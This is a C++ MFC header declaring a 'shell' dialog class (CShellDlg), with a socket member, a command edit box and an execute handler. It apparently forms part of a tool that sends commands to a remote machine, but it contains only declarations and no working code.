#pragma once
#include "afxwin.h"


// CShellDlg 对话框

class CShellDlg : public CDialogEx
{
	DECLARE_DYNAMIC(CShellDlg)

public:
	BOOL OnInitDialog();
	SOCKET ClientSocket;
	CShellDlg(SOCKET s,CWnd* pParent = NULL);   // 标准构造函数
	virtual ~CShellDlg();

// 对话框数据
	enum { IDD = IDD_SHELL };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	CEdit m_CmdEdit;
	CString m_cmd;
	CString	m_command;
	afx_msg void OnClickedExecute();
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	afx_msg void OnShowWindow(BOOL bShow, UINT nStatus);
};
